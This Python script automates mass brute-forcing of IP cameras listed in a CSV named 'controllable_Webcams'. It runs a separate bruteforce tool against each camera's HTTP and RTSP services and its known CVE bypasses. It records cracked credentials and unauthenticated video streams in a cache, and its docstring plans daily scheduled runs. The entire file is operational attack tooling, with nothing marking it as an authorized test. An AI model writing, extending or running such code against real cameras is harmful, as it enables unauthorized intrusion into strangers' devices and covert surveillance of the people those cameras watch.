"""mass_bf_all.py — Run ultimate_bruteforce on every IP cam in CSV.

Smart batching:
- 3 parallel ultimate_bruteforce processes (each one is already multithreaded)
- Skip IPs already in cache
- Update CSV with found creds
- Schedule via Task Scheduler for daily runs
"""
import csv
import json
import os
import re
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

CSV_PATH = r'C:\Users\eli6-admin\Documents\eli6-surveillance\controllable_Webcams.csv'
LOG_PATH = r'C:\Users\eli6-admin\Documents\eli6-surveillance\bruteforce\mass_all_log.txt'
CACHE_PATH = r'C:\Users\eli6-admin\Documents\eli6-surveillance\backups\cam_bruteforce_results.json'
ULTIMATE_BF = r'C:\Users\eli6-admin\Documents\eli6-surveillance\bruteforce\ultimate_bruteforce.py'

PYTHON = r'C:\Users\eli6-admin\AppData\Local\Programs\Python\Python312\python.exe'

# Common alt ports for cams (besides 80)
COMMON_PORTS = [80, 8080, 8081, 8082, 8090, 8888, 8088, 8181, 81, 82, 8000, 8008, 443]


def log(msg):
    line = f'[{time.strftime("%H:%M:%S")}] {msg}'
    print(line, flush=True)
    try:
        with open(LOG_PATH, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
    except Exception:
        pass


def load_cache():
    if os.path.exists(CACHE_PATH):
        try:
            with open(CACHE_PATH, 'r') as f:
                return json.load(f)
        except Exception:
            return {}
    return {}


def save_cache(cache):
    os.makedirs(os.path.dirname(CACHE_PATH), exist_ok=True)
    with open(CACHE_PATH, 'w') as f:
        json.dump(cache, f, indent=1)


def bf_one_target(ip, port, wordlist='top5'):
    """Run ultimate_bruteforce on a single ip:port. Returns parsed dict."""
    try:
        result = subprocess.run(
            [PYTHON, ULTIMATE_BF, ip, '--port', str(port),
             '--rtsp-port', '554', '--rtsp', '--cve', '--wordlist', wordlist,
             '--timeout', '3', '--workers', '8'],
            capture_output=True, text=True, timeout=120
        )
        out = result.stdout
        success = {}
        for m in re.finditer(r'HTTP AUTH OK: ([^\s]+):([^\s]+)', out):
            success.setdefault('http_creds', []).append(f'{m.group(1)}:{m.group(2)}')
        for m in re.finditer(r'CVE BYPASS: (\w+)', out):
            success.setdefault('cves', []).append(m.group(1))
        for m in re.finditer(r'RTSP UNAUTH OK: ([^\s]+)', out):
            success.setdefault('rtsp_unauth', []).append(m.group(1))
        for m in re.finditer(r'RTSP AUTH OK: ([^\s]+):([^\s]+) @ ([^\s]+)', out):
            success.setdefault('rtsp_creds', []).append(f'{m.group(1)}:{m.group(2)} @{m.group(3)}')
        success['port'] = port
        return success
    except subprocess.TimeoutExpired:
        return {'port': port, 'error': 'timeout'}
    except Exception as e:
        return {'port': port, 'error': str(e)}


def main():
    log('[init] starting mass BF on all IP cams')
    cache = load_cache()
    log(f'[cache] {len(cache)} cached results')

    with open(CSV_PATH, 'r', encoding='utf-8', newline='') as f:
        rows = list(csv.reader(f))
    header = rows[0]

    cols = {h: i for i, h in enumerate(header)}
    HOST = cols['host']
    AUTH_USER = cols.get('auth_user', None)
    AUTH_PASS = cols.get('auth_pass', None)
    AUTH_REQ = cols.get('auth_required', None)

    # Find IP cams with their default port (from URL column 2)
    target_ips = {}  # ip -> primary_port
    for r in rows[1:]:
        if len(r) <= HOST:
            continue
        h = r[HOST].strip()
        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', h):
            continue
        # Skip if already authed
        if AUTH_USER is not None and len(r) > AUTH_USER and r[AUTH_USER]:
            continue
        # Get port from URL
        url = r[2] if len(r) > 2 else ''
        port = 80
        m = re.match(r'https?://[^:/]+:(\d+)', url)
        if m:
            port = int(m.group(1))
        target_ips.setdefault(h, port)

    log(f'[plan] {len(target_ips)} unique IPs')

    # Cache key includes port
    def key(ip, port):
        return f'{ip}:{port}'

    # Run BF on each
    tasks = [(ip, port) for ip, port in target_ips.items() if key(ip, port) not in cache]
    log(f'[plan] {len(tasks)} to process')

    new_results = 0
    done = 0
    with ThreadPoolExecutor(max_workers=3) as ex:
        futures = {ex.submit(bf_one_target, ip, port, 'top5'): (ip, port)
                   for ip, port in tasks[:200]}  # limit per run
        for f in as_completed(futures):
            done += 1
            ip, port = futures[f]
            try:
                result = f.result()
            except Exception as e:
                result = {'error': str(e)}
            cache[key(ip, port)] = result
            new_results += 1
            hits = []
            if result.get('http_creds'):
                hits.append(f'HTTP={result["http_creds"]}')
            if result.get('cves'):
                hits.append(f'CVE={result["cves"]}')
            if result.get('rtsp_unauth'):
                hits.append(f'RTSP-unauth={result["rtsp_unauth"]}')
            if result.get('rtsp_creds'):
                hits.append(f'RTSP={result["rtsp_creds"]}')
            if hits:
                log(f'  [+] {ip}:{port} -> {" ".join(hits)}')
            else:
                log(f'  [-] {ip}:{port} no hits')
            if done % 5 == 0:
                save_cache(cache)

    save_cache(cache)
    log(f'[done] {new_results} new results, {len(cache)} total cached')


if __name__ == '__main__':
    main()
